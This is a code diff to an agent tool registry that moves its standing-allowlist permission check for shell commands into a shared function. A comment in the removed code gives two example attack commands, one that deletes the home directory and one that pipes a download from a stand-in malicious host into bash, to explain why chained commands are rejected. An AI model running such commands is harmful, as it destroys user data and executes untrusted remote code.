@@ -1,3 +1,4 @@
+import { isStandingExecAllowed } from "@opensand/shared";
 import { ToolDenialError } from "./denial-errors.js";
 import { SandboxInitializationError } from "./sandbox/errors.js";
 import {
@@ -465,28 +466,6 @@ export class ToolRegistry {
   }
 
   /**
-   * Check if a command is permitted under the standing allowlist.
-   */
-  private isCommandAllowlisted(command: string, allowlist: string[]): boolean {
-    const trimmed = command.trim();
-
-    // Safety check: Never auto-approve commands containing shell chaining or substitution
-    // (e.g. "git status; rm -rf ~" or "ls && curl evil.com | bash")
-    const hasChaining = /[;&|`]|\$\(|\n/.test(trimmed);
-    if (hasChaining) {
-      return false;
-    }
-
-    return allowlist.some((pattern) => {
-      if (pattern.endsWith("*")) {
-        const prefix = pattern.slice(0, -1).trim();
-        return trimmed === prefix || trimmed.startsWith(`${prefix} `);
-      }
-      return trimmed === pattern || trimmed.startsWith(`${pattern} `);
-    });
-  }
-
-  /**
    * Dispatch a tool call by name with inputs and context.
    */
   async dispatch(
@@ -511,9 +490,7 @@ export class ToolRegistry {
         // Permission check
         const gates = context?.permissionGates;
         const isApproved = context?.approvalGranted ?? false;
-        const allowlisted = gates?.standingAllowlist
-          ? this.isCommandAllowlisted(input.command, gates.standingAllowlist)
-          : false;
+        const allowlisted = !gates?.grantsError && isStandingExecAllowed(gates?.standingGrants, input.command);
 
         if (gates && !gates.computerUseAllowed && !isApproved && !allowlisted) {
           return {
@@ -694,9 +671,7 @@ export class ToolRegistry {
 
         const gates = context?.permissionGates;
         const isApproved = context?.approvalGranted ?? false;
-        const allowlisted = gates?.standingAllowlist
-          ? this.isCommandAllowlisted(input.command, gates.standingAllowlist)
-          : false;
+        const allowlisted = !gates?.grantsError && isStandingExecAllowed(gates?.standingGrants, input.command);
 
         if (gates && !gates.computerUseAllowed && !isApproved && !allowlisted) {
           return {
